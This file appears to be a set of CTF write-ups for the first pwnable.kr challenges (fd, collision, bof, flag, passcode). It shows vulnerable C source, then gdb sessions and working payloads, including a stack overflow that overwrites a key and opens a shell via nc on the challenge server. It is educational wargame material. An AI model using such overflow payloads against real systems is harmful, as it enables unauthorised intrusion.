@@ -1,0 +1,367 @@
+1.[fd]
+
+fd@ubuntu:~$ cat fd.c 
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+char buf[32];
+int main(int argc, char* argv[], char* envp[]){
+	if(argc<2){
+		printf("pass argv[1] a number\n");
+		return 0;
+	}
+	int fd = atoi( argv[1] ) - 0x1234;             //convert argv[1] to hex
+	int len = 0;
+	len = read(fd, buf, 32);                       // Read 32 counts start with fd(=0) into buff.
+	if(!strcmp("LETMEWIN\n", buf)){                // if buf="LETMEWIN",good job!
+		printf("good job :)\n");
+		system("/bin/cat flag");
+		exit(0);
+	}
+	printf("learn about Linux file IO\n");
+	return 0;
+
+}
+
+---------------------------------------------------------------------------------------------------------------------------------------
+Solution:
+
+fd@ubuntu:~$ python -c 'print 0x1234'
+4660
+
+fd@ubuntu:~$ ./fd  4660
+LETMEWIN
+good job :)
+mommy! I think I know what a file descriptor is!!     //auth flag
+
+--------------------------------------------------------------------------------------------------------------------------------------
+	
+2.collision
+
+col@ubuntu:~$ cat col.c
+#include <stdio.h>
+#include <string.h>
+unsigned long hashcode = 0x21DD09EC; 
+unsigned long check_password(const char* p){
+	int* ip = (int*)p;
+	int i;
+	int res=0;
+	for(i=0; i<5; i++){
+		res += ip[i];
+	}
+	return res;
+}
+
+int main(int argc, char* argv[]){
+	if(argc<2){
+		printf("usage : %s [passcode]\n", argv[0]);
+		return 0;
+	}
+	if(strlen(argv[1]) != 20){                                 //The length of passcode is 20
+		printf("passcode length should be 20 bytes\n");
+		return 0;
+	}
+
+	if(hashcode == check_password( argv[1] )){                 //If check_password(passcode) == hashcode,could pass.
+		system("/bin/cat flag");
+		return 0;
+	}
+	else
+		printf("wrong passcode.\n");
+	return 0;
+}
+---------------------------------------------------------------------------------------------------------------------------------------
+Solution:
+
+We could assume all hex values for first 16 charactors is '0x01',so every 4 charactors's hex value is "0x01010101"
+So the hex value for the left is:0x21DD09EC - 0x01010101*4 = 0x1dd905e8
+
+col@ubuntu:~$ python -c 'print hex(0x21DD09EC - 0x01010101*4)'
+0x1dd905e8
+
+We could create a input passcode like "\x01\x01\x01\x01"*4 + "\xe8\x05\xd9\x1d".
+
+col@ubuntu:~$ ./col  `python -c 'print "\x01\x01\x01\x01"*4 + "\xe8\x05\xd9\x1d"'`
+daddy! I just managed to create a hash collision :)            //get the flag
+-----------------------------------------------------------------------------------------------------------------------------------------
+
+3.bof
+
+yuanjideMacBook-Air:yuanjizhao root# cat bof.c 
+#include <stdio.h>
+#include <string.h>
+#include <stdlib.h>
+void func(int key){
+	char overflowme[32];
+	printf("overflow me : ");
+	gets(overflowme);	// smash me!
+	if(key == 0xcafebabe){
+		system("/bin/sh");
+	}
+	else{
+		printf("Nah..\n");
+	}
+}
+int main(int argc, char* argv[]){
+	func(0xdeadbeef);
+	return 0;
+}
+
+---------------------------------------------------------------------------------------------------------------------------------------
+Solution:
+Download the program.
+root@debian:~/pwnable# wget http://pwnable.kr/bin/bof
+
+Use gdb to debug it.
+root@debian:~/pwnable# gdb bof
+gdb-peda$ start                       
+gdb-peda$ disassemble func
+Dump of assembler code for function func:
+   0x0040062c <+0>:     push   ebp
+   0x0040062d <+1>:     mov    ebp,esp
+   0x0040062f <+3>:     sub    esp,0x48
+   0x00400632 <+6>:     mov    eax,gs:0x14
+   0x00400638 <+12>:    mov    DWORD PTR [ebp-0xc],eax
+   0x0040063b <+15>:    xor    eax,eax
+   0x0040063d <+17>:    mov    DWORD PTR [esp],0x40078c
+   0x00400644 <+24>:    call   0xb7e532c0 <__GI__IO_puts>
+   0x00400649 <+29>:    lea    eax,[ebp-0x2c]
+   0x0040064c <+32>:    mov    DWORD PTR [esp],eax
+   0x0040064f <+35>:    call   0xb7e52a60 <_IO_gets>
+=> 0x00400654 <+40>:    cmp    DWORD PTR [ebp+0x8],0xcafebabe        //if $ebp+0x8=0xcafebabe,pass.
+   0x0040065b <+47>:    jne    0x40066b <func+63>
+   0x0040065d <+49>:    mov    DWORD PTR [esp],0x40079b
+   0x00400664 <+56>:    call   0xb7e28c00 <__libc_system>
+   0x00400669 <+61>:    jmp    0x400677 <func+75>
+   0x0040066b <+63>:    mov    DWORD PTR [esp],0x4007a3
+   0x00400672 <+70>:    call   0xb7e532c0 <__GI__IO_puts>
+   0x00400677 <+75>:    mov    eax,DWORD PTR [ebp-0xc]
+   0x0040067a <+78>:    xor    eax,DWORD PTR gs:0x14
+   0x00400681 <+85>:    je     0x400688 <func+92>
+   0x00400683 <+87>:    call   0xb7ef5080 <__stack_chk_fail>
+   0x00400688 <+92>:    leave  
+   0x00400689 <+93>:    ret    
+End of assembler dump.
+gdb-peda$ b * 0x00400654
+Breakpoint 2 at 0x400654
+gdb-peda$ def hook-stop                 
+Type commands for definition of "hook-stop".
+End with a line saying just "end".
+>x/24wx $esp
+>x/2i $eip
+>x/wx $ebp+0x8
+>end
+gdb-peda$ r
+Starting program: /root/pwnable/bof 
+overflow me : 
+AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ
+0xbffffbf0:     0xbffffc0c      0xbffffcf4      0xb7fc4000      0x00000000
+0xbffffc00:     0x00000000      0xb7fc4000      0xb7e1bcb9      0x41414141
+0xbffffc10:     0x42424242      0x43434343      0x44444444      0x45454545
+0xbffffc20:     0x46464646      0x47474747      0x48484848      0x49494949
+0xbffffc30:     0x4a4a4a4a      0x4b4b4b4b      0x4c4c4c4c      0x4d4d4d4d
+0xbffffc40:     0x4e4e4e4e      0x4f4f4f4f      0x50505050      0x51515151
+=> 0x400654 <func+40>:  cmp    DWORD PTR [ebp+0x8],0xcafebabe
+   0x40065b <func+47>:  jne    0x40066b <func+63>
+0xbffffc40:     0x4e4e4e4e                                
+
+Breakpoint 2, 0x00400654 in func ()
+gdb-peda$ !
+root@debian:~/pwnable# python -c 'print chr(0x4e)'
+N                                                    //The value for the address 0xbffffc40 is "NNNN",change it to hex value 0xcafebabe,we'll get the exploit successfully. So,create a payload use python like the below.
+
+root@debian:~/pwnable# python -c 'print "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMM"+"\xbe\xba\xfe\xca"'  > attack.txt
+
+Return to gdb session use "exit".
+gdb-peda$ r < attack.txt
+gdb-peda$ r < attack.txt 
+Starting program: /root/pwnable/bof < attack.txt
+overflow me : 
+0xbffffbf0:     0xbffffc0c      0xbffffcf4      0xb7fc4000      0x00000000
+0xbffffc00:     0x00000000      0xb7fc4000      0xb7e1bcb9      0x41414141
+0xbffffc10:     0x42424242      0x43434343      0x44444444      0x45454545
+0xbffffc20:     0x46464646      0x47474747      0x48484848      0x49494949
+0xbffffc30:     0x4a4a4a4a      0x4b4b4b4b      0x4c4c4c4c      0x4d4d4d4d
+0xbffffc40:     0xcafebabe      0x00000000      0x004006b9      0x00000000
+=> 0x400654 <func+40>:  cmp    DWORD PTR [ebp+0x8],0xcafebabe
+   0x40065b <func+47>:  jne    0x40066b <func+63>
+0xbffffc40:     0xcafebabe
+
+Breakpoint 2, 0x00400654 in func ()
+gdb-peda$ c                              //exploit to /usr/bin/dash.
+Continuing.
+[Attaching after process 4430 fork to child process 4437]
+[New inferior 2 (process 4437)]
+[Detaching after fork from parent process 4430]
+[Inferior 1 (process 4430) detached]
+process 4437 is executing new program: /usr/bin/dash
+[Attaching after process 4437 fork to child process 4441]
+[New inferior 3 (process 4441)]
+[Detaching after fork from parent process 4437]
+[Inferior 2 (process 4437) detached]
+process 4441 is executing new program: /usr/bin/dash
+*** stack smashing detected ***: <unknown> terminated
+[Inferior 3 (process 4441) exited normally]
+Error while running hook_stop:
+No registers.
+gdb-peda$ quit
+
+root@debian:~/pwnable# (cat attack.txt;cat) |nc pwnable.kr 9000       //Or use (python -c 'print "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMM"+"\xbe\xba\xfe\xca"';cat) | nc pwnable.kr 9000  
+id
+uid=1008(bof) gid=1008(bof) groups=1008(bof)
+ls
+bof
+bof.c
+flag
+log
+log2
+super.pl
+cat flag
+daddy, I just pwned a buFFer :)            //the answer flag
+
+--------------------------------------------------------------------------------------------------------------------------------------
+
+4.flag
+
+root@ubuntu:/# wget http://pwnable.kr/bin/flag
+
+root@ubuntu:/# od -t x1z flag|more                  //use od command to check the file.
+0000000 7f 45 4c 46 02 01 01 03 00 00 00 00 00 00 00 00  >.ELF............<
+0000020 02 00 3e 00 01 00 00 00 f0 a4 44 00 00 00 00 00  >..>.......D.....<
+0000040 40 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  >@...............<
+0000060 00 00 00 00 40 00 38 00 02 00 40 00 00 00 00 00  >....@.8...@.....<
+0000100 01 00 00 00 05 00 00 00 00 00 00 00 00 00 00 00  >................<
+0000120 00 00 40 00 00 00 00 00 00 00 40 00 00 00 00 00  >..@.......@.....<
+0000140 04 ad 04 00 00 00 00 00 04 ad 04 00 00 00 00 00  >................<
+0000160 00 00 20 00 00 00 00 00 01 00 00 00 06 00 00 00  >.. .............<
+0000200 d8 62 0c 00 00 00 00 00 d8 62 6c 00 00 00 00 00  >.b.......bl.....<
+0000220 d8 62 6c 00 00 00 00 00 00 00 00 00 00 00 00 00  >.bl.............<
+0000240 00 00 00 00 00 00 00 00 00 00 20 00 00 00 00 00  >.......... .....<
+0000260 fc ac e0 a1 55 50 58 21 1c 08 0d 16 00 00 00 00  >....UPX!........<           //include UPX info
+0000300 21 7c 0d 00 21 7c 0d 00 90 01 00 00 92 00 00 00  >!|..!|..........<
+0000320 08 00 00 00 f7 fb 93 ff 7f 45 4c 46 02 01 01 03  >.........ELF....<
+0000340 00 02 00 3e 00 01 0e 58 10 40 1f df 2f ec db 40  >...>...X.@../..@<
+0000360 2f 78 38 0c 45 26 38 00 06 0a 21 00 1f 6c 60 bf  >/x8.E&8...!..l`.<
+
+
+root@ubuntu:/# strings flag|more                   //use strings to check
+UPX!                                               //include UPX info
+@/x8
+gX lw_
+H/\_@
+	Kl$
+H9\$(t
+[]]y
+nIV,Uh
+AWAVAUATS
+uSL9
+>t		.
+[A\AA;h
+
+The binary has been packed by UPX packer,we should unpack it first.
+
+root@ubuntu:/# file flag
+flag.1: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, stripped
+
+root@ubuntu:/# upx -d flag
+                       Ultimate Packer for eXecutables
+                          Copyright (C) 1996 - 2017
+UPX 3.94        Markus Oberhumer, Laszlo Molnar & John Reiser   May 12th 2017
+
+        File size         Ratio      Format      Name
+   --------------------   ------   -----------   -----------
+    883745 <-    335288   37.94%   linux/amd64   flag
+
+Unpacked 1 file.
+
+root@ubuntu:/# file flag
+flag: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, for GNU/Linux 2.6.24, BuildID[sha1]=96ec4cc272aeb383bd9ed26c0d4ac0eb5db41b16, not stripped
+
+--------------------------------------------------------------------------------------------------------------------------------------
+Solution:
+
+Use gdb to debug the binary
+
+root@ubuntu:/# gdb flag
+gdb-peda$ disassemble  main
+Dump of assembler code for function main:
+   0x0000000000401164 <+0>:	push   rbp
+   0x0000000000401165 <+1>:	mov    rbp,rsp
+   0x0000000000401168 <+4>:	sub    rsp,0x10
+   0x000000000040116c <+8>:	mov    edi,0x496658
+   0x0000000000401171 <+13>:	call   0x402080 <puts>
+   0x0000000000401176 <+18>:	mov    edi,0x64
+   0x000000000040117b <+23>:	call   0x4099d0 <malloc>
+   0x0000000000401180 <+28>:	mov    QWORD PTR [rbp-0x8],rax
+   0x0000000000401184 <+32>:	mov    rdx,QWORD PTR [rip+0x2c0ee5]        # 0x6c2070 <flag>   //the value of rip+0x2c0ee5 is flag.
+   0x000000000040118b <+39>:	mov    rax,QWORD PTR [rbp-0x8]
+   0x000000000040118f <+43>:	mov    rsi,rdx
+   0x0000000000401192 <+46>:	mov    rdi,rax
+   0x0000000000401195 <+49>:	call   0x400320
+   0x000000000040119a <+54>:	mov    eax,0x0
+   0x000000000040119f <+59>:	leave  
+   0x00000000004011a0 <+60>:	ret    
+End of assembler dump.
+
+gdb-peda$ b * 0x000000000040118b
+Breakpoint 2 at 0x40118b
+
+gdb-peda$ r
+
+gdb-peda$ x/wx $rip+0x2c0ee5               
+0x6c2070 <flag>:	0x00496628
+
+gdb-peda$ x/s 0x00496628
+0x496628:	"UPX...? sounds like a delivery service :)"          //Got the flag
+
+--------------------------------------------------------------------------------------------------------------------------------------
+
+5.passcode
+
+passcode@prowl:~$ cat passcode.c 
+#include <stdio.h>
+#include <stdlib.h>
+
+void login(){
+	int passcode1;
+	int passcode2;
+
+	printf("enter passcode1 : ");
+	scanf("%d", passcode1);
+	fflush(stdin);
+
+	// ha! mommy told me that 32bit is vulnerable to bruteforcing :)
+	printf("enter passcode2 : ");
+        scanf("%d", passcode2);
+
+	printf("checking...\n");
+	if(passcode1==338150 && passcode2==13371337){
+                printf("Login OK!\n");
+                system("/bin/cat flag");
+        }
+        else{
+                printf("Login Failed!\n");
+		exit(0);
+        }
+}
+
+void welcome(){
+	char name[100];
+	printf("enter you name : ");
+	scanf("%100s", name);
+	printf("Welcome %s!\n", name);
+}
+
+int main(){
+	printf("Toddler's Secure Login System 1.0 beta.\n");
+
+	welcome();
+	login();
+
+	// something after login...
+	printf("Now I can safely trust you that you have credential :)\n");
+	return 0;	
+}
+
+
+
